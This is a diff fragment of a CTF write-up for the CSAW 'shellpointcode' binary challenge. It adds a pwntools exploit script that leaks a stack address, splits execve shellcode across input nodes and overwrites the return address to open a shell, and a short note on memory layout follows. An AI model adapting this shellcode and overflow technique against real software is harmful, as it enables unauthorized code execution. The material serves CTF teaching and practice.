@@ -18,7 +18,27 @@ push SYS_execve
 pop rax
 syscall
 ```
-
+```python
+from pwn import *
+g_local=True
+context.log_level='debug'
+if g_local:
+	sh = process('./shellpointcode')#env={'LD_PRELOAD':'./libc.so.6'}
+	gdb.attach(sh)
+else:
+	sh = remote("pwn.chal.csaw.io", 9005)
+shellcode = "lea rdi,[rsp+0x28]\nxor rdx,rdx\nxor rsi,rsi"
+sh.recvuntil("(15 bytes) Text for node 1:  \n")
+sh.send("/bin/sh\x00\n")
+sh.recvuntil("(15 bytes) Text for node 2: \n")
+sh.send("A" * 5 + asm("\npush SYS_execve\npop rax\nsyscall", arch='amd64')  + "\n")
+sh.recvuntil("node.next: 0x")
+leak = sh.recv(6*2)
+ret_addr = int(leak, 16)
+sh.recvuntil("What are your initials?\n")
+sh.send("A" * (3+8) + p64(ret_addr) + asm(shellcode, arch='amd64') + "\xeb\n")
+sh.interactive()
+```
 to node 2 and initials
 
 bacause the memory layout, is initials, node 2, node 1, from low address to high address
